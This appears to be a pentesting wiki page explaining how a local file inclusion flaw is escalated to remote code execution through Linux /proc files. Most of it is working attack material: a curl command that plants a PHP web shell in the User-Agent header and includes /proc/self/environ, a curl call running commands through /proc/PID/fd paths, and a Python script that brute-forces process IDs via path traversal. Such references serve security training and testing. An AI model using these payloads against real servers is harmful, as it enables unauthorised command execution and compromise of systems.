# /proc

## Theory

**/proc** is very special in that it is also a virtual filesystem. It's sometimes referred to as a process information pseudo-file system. It doesn't contain 'real' files but runtime system information (e.g. system memory, devices mounted, hardware configuration, etc).

We may use it to gain remote code execution using a LFI vulnerability&#x20;

## Practice

{% tabs %}
{% tab title="/proc/self/environ" %}
Like a log file, send the payload in the User-Agent, it may be reflected inside the /**proc/self/environ** file

```bash
# Sending a request to $URL with a malicious user-agent
# Accessing the payload via LFI
curl --user-agent "<?php passthru(\$_GET['cmd']); ?>" $URL/?parameter=../../../proc/self/environ
```
{% endtab %}

{% tab title="/proc/*/fd/*" %}
If you can upload files but don't where they are located on the disk, you may use this method.

Upload a lot of shells (for example : 100), and then include the /proc/$PID/fd/$FD in your LFI:

```bash
# Accessing the payload via LFI
curl $URL?page=/proc/$PID/fd/$FD?cmd=id
```

You can brute force PID using this script, the adapt it to brute force FD

```python
import requests
import re

print("Running: ") 
for x in range(0,10000):

	url = "http://vulnerable.website/../../../../../../proc/"+ str(x) +"/cmdline"
	r = requests.get(url)
	length_of_resp = len(r.content)
	content = r.content
	
	if (length_of_resp > 150):
		print("FOUND PROCESS") 
		print("URL:" + r.url) 	
		print("Length:" + str(length_of_resp))
		print("Result:", re.split("/cmdline/" , str(content) ) )
		print("#####################################\n") 
```
{% endtab %}
{% endtabs %}
